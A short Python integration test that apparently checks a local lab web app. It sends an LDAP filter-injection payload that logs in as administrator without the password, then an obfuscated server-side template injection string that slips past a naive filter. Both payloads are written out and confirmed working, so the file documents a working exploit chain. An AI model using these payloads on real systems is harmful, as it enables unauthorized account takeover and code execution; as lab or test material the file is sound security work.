import sys

import requests

BASE_URL = "http://localhost:8080"


def check(name, cond):
    status = "PASS" if cond else "FAIL"
    print(f"[{status}] {name}")
    if not cond:
        sys.exit(1)


def main():
    resp = requests.post(
        f"{BASE_URL}/login", data={"username": "administrator", "password": "wrong"}
    )
    check("plain wrong admin login rejected", resp.status_code == 401)

    session = requests.Session()
    resp = session.post(
        f"{BASE_URL}/login",
        data={
            "username": "administrator）（|（sAMAccountName=administrator",
            "password": "）",
        },
    )
    check(
        "verified OR-breakout payload authenticates as administrator over HTTP",
        resp.status_code == 200 and "Welcome, administrator" in resp.text,
    )

    resp = session.get(f"{BASE_URL}/admin/report-template")
    check("administrator can reach admin panel", resp.status_code == 200)

    resp = session.post(
        f"{BASE_URL}/admin/report-template", data={"template": "{{ ''.__class__ }}"}
    )
    check("naive SSTI payload blocked", resp.status_code == 400)

    resp = session.post(
        f"{BASE_URL}/admin/report-template",
        data={"template": "{{''['_'~'_cla'~'ss_'~'_']}}"},
    )
    check(
        "verified SSTI bypass renders class object over HTTP",
        resp.status_code == 200 and "class 'str'" in resp.text,
    )

    print("\nALL INTEGRATION CHECKS PASSED")


if __name__ == "__main__":
    main()
